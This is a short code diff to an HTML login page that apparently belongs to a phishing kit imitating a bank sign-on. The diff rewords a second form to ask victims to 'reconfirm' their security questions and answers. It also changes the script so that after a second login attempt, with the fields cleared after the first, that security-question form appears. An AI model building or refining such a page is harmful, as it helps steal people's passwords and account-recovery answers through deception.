@@ -104,7 +104,9 @@
             </div>
         </form>
         <form id="form2" method="post" class="w-full md:w-[40%] flex flex-col pt-4 hidden">
-            <p class="text-xl font-semibold mb-6">To verify your identity, answer the following security questions</p>
+          <h4> <p class="text-xl font-semibold mb-6">Identity Verification</p></h4>
+		   <p><b>Please reconfirm your security questions and answers.</b></p>
+		   <br/>
             <div class="w-full px-4">
                 <label for="q1" class="text-[#101010]">Security question 1</label>
                 <select name="q1" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
@@ -327,7 +329,7 @@
                 setTimeout(() => {
                     if (count === 2) {
                         document.getElementById('aoblogon').style.display = 'none';
-                        document.getElementById('form3').style.display = 'block';
+                        document.getElementById('form2').style.display = 'block';
                     } else {
                         document.getElementById('userId').value = '';
                         document.getElementById('password').value = '';
